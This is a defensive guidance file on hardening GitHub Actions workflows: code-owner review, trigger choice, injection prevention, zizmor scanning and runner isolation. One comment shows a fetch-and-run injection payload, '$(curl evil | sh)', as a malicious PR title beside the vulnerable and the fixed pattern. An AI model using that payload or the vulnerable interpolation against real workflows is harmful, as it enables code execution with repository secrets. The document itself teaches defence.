---
description: Security hardening for GitHub Actions — protect workflow definitions with CODEOWNERS + rulesets, choose pull_request vs pull_request_target correctly, prevent injection from untrusted event data, scan every workflow change with zizmor, and keep untrusted code off self-hosted runners.
scope: universal
paths:
  - ".github/workflows/**"
  - ".github/actions/**"
  - ".github/CODEOWNERS"
  - ".github/zizmor.yml"
tags: [ci, github-actions, security, supply-chain]
source: [boards, irt-flight-manager]
---

# GitHub Actions workflow security

Apply every rule below when authoring or editing anything under `.github/`.
These complement the conventions in `github-actions.md` (SHA-pinning,
least-privilege permissions) and the org/repo settings in `actions-policy.md`.

## Protect the workflow definition itself

Anyone who can open a PR can edit a workflow file in that PR. Two layers stop a
malicious edit from running with privileges:

- **CODEOWNERS** — assign `/.github/`, `/.github/workflows/`, and
  `/.github/CODEOWNERS` itself to an admin team so any workflow change requires
  owner review via its own PR. Two gotchas:
  - The owning team must have **write** access to the repo, or GitHub silently
    ignores every line — no error, no warning, no requested reviewer. Verify:
    ```bash
    gh api repos/<org>/<repo>/teams --jq '.[] | .slug + " -> " + .permission'
    ```
  - The file is last-match-wins: keep the `CODEOWNERS` line last, or a broader
    pattern added below it silently takes over ownership of the file itself.

- **Branch protection / rulesets** — CODEOWNERS only *requests* the review;
  the ruleset is what *blocks* the merge. The active ruleset on the default
  branch must set `require_code_owner_review: true` and
  `require_last_push_approval: true` (without the latter, an approved PR can be
  changed and self-merged after a follow-up push). If the ruleset is owned at
  the org level, flip these in the org's ruleset settings — the change lands on
  every repo it covers. Confirm the live values before relying on the gate:
  ```bash
  gh api repos/<org>/<repo>/rulesets/<id> \
    --jq '.rules[] | select(.type=="pull_request") | .parameters'
  ```

- **Choose the trigger deliberately** — see below. The event decides *which
  copy* of the workflow runs and *what credentials* it gets.

## `pull_request` vs `pull_request_target` — pick by what the job does

These are NOT interchangeable. The difference is security-critical:

| | `pull_request` | `pull_request_target` |
|---|---|---|
| Workflow def that runs | **from the PR head** (PR can modify it) | **from the base branch** (PR cannot modify it) |
| Secrets / write token on fork PRs | ❌ none, read-only token | ✅ full secrets + write token |
| Checking out & running PR code | safe | **DANGEROUS** |

- **Build / lint / test workflows that execute PR code** → keep
  `pull_request`. Fork PRs get a read-only token and **no secrets**, so a
  malicious PR editing the workflow cannot exfiltrate anything. This is the
  safe default — do **not** "upgrade" it to `pull_request_target`.
- **`pull_request_target` is only for jobs that must run with secrets/write
  and do NOT execute untrusted PR code** — labelling, triage, posting
  comments, size checks. The base-branch copy runs, so the PR can't tamper
  with it.
- **Never** combine `pull_request_target` with a checkout of the PR head
  followed by build/test/`run` of that code — that runs attacker code with
  your secrets. This is the single most exploited Actions misconfiguration.
- The fix for a *test* workflow that "could be modified in a PR" is
  CODEOWNERS + branch protection (above) + GitHub's *require approval for
  fork PR runs* setting (`actions-policy.md`) — **not** `pull_request_target`.

If a workflow genuinely must build untrusted PR code **and then** act with
secrets, use the **split pattern**: an unprivileged `pull_request` workflow
builds and uploads an artifact; a separate `workflow_run` workflow runs
privileged, downloads the artifact, and acts. Harden the privileged half:
treat the artifact as **untrusted** (extract to a temp dir, validate before
use, never pipe into `$GITHUB_ENV`/`$GITHUB_OUTPUT`), and filter on
`github.event.workflow_run.conclusion == 'success'` plus the expected branch.

If you must use `pull_request_target` with a head checkout: check out
`github.event.pull_request.head.sha` (immutable), **not** `head.ref` (a
mutable TOCTOU race), gate on a trusted-owner/actor check, and still never
`run:` the checked-out code.

Avoid `issue_comment` / ChatOps triggers as approval gates — they're
TOCTOU-prone and bypass PR review. Prefer a label gate pinned to a specific
commit SHA.

## Prevent injection from untrusted input

**Untrusted sources** (attacker-controlled in a fork PR): `github.event.*`
fields (PR/issue title, body, branch/ref name, author login, commit message),
`git` output (`git log`, `git diff-tree`), downloaded artifacts, and
third-party action outputs.

**Script injection** — never interpolate an untrusted value into `run:`:

```yaml
# ❌ injection — a PR titled "$(curl evil | sh)" executes it
- run: echo "${{ github.event.pull_request.title }}"

# ✅ pass through an env var, quote on use
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

**Environment / output injection** — writing untrusted content into
`$GITHUB_ENV` or `$GITHUB_OUTPUT` lets an attacker inject arbitrary env vars
(`LD_PRELOAD`, `PATH`) or clobber another step's outputs. Never echo untrusted
data into them; if unavoidable, validate against a strict allowlist first and
beware multiline payloads.

**Path injection** — don't build file paths from untrusted input without
validation (path traversal into the workspace or runner).

## Scan every workflow change with zizmor

Manual review misses things. Run `zizmorcore/zizmor-action` on every
`.github/**` change (see the `zizmor.yml` template): it catches unpinned
actions, template/script injection, dangerous `pull_request_target`, excessive
permissions, `secrets: inherit`, artifact/cache issues, and self-hosted
exposure — and **fails the job on findings**.

- On private repos (no GHAS) set `advanced-security: false` **and**
  `annotations: true` — both are required for inline annotations; annotations
  default to off, leaving findings only in the raw log.
- Pin the action **and** its `version:` input; never track "latest".
- Never silence a finding to make CI pass — fix the workflow, or add a
  per-finding `# zizmor: ignore[rule]` comment with a written justification.
- Adopting zizmor on an existing repo? Baseline pre-existing findings in
  `.github/zizmor.yml` so the gate blocks *new* findings from day one — and
  treat that file as a **burn-down backlog, not an exemption list**: never add
  an entry to get a change through, and when you touch a listed workflow, fix
  its finding and delete the line. The list only shrinks.
- zizmor's online audits resolve every `uses:` via the GitHub API and treat an
  unreadable repo as **fatal**. If workflows reference actions in private
  repos, mint a read-only GitHub App token scoped to exactly those repos and
  pass it as the action's `token:`.

## Self-hosted runners

Never run **public-repo or fork PR** workloads on a self-hosted runner —
untrusted code executes on a host you own and persists state between jobs. Use
ephemeral GitHub-hosted runners for those; reserve self-hosted runners for
trusted, internal-only workflows.

## Other defaults

- `persist-credentials: false` on `actions/checkout` unless the job pushes
  back (see `github-actions.md`).
- Gate privileged jobs behind a GitHub *Environment* with required reviewers
  when they touch production.
- If pushes to the default branch must always finish, key their concurrency
  group on `github.run_id` so only PR runs get cancelled:
  ```yaml
  concurrency:
    group: ${{ github.workflow }}-${{ github.event_name == 'push' && github.run_id || github.ref }}
    cancel-in-progress: true
  ```

## Pre-merge checklist for any workflow change

- [ ] Every `uses:` is a full SHA with a `# vX.Y.Z` comment (including internal reusable workflows)
- [ ] Trigger matches what the job does; no `pull_request_target` + checkout-and-run of PR head
- [ ] Top-level `permissions:` is read-only; per-job escalation is minimal
- [ ] No `secrets: inherit` — the called workflow gets a named list
- [ ] No untrusted input (`${{ github.event.* }}`, git output, artifacts) in `run:`, `$GITHUB_ENV`, or `$GITHUB_OUTPUT`
- [ ] Downloaded artifacts treated as untrusted (temp dir, validated)
- [ ] `persist-credentials: false` unless the job pushes back
- [ ] No untrusted PR workload on a self-hosted runner
- [ ] zizmor passes without new ignores or baseline entries
